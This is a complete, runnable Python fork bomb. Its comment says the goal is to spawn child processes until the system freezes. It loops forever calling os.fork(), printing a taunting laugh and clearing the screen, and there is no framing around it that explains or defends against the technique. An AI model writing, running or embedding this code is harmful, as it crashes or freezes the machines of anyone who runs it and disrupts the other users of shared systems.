#!/usr/bin/env python3

# Create child processes until the system freeze

import os

while True:
    os.fork() 
    print("MOUAHAHAHAHAAH!")
    os.system('clear')
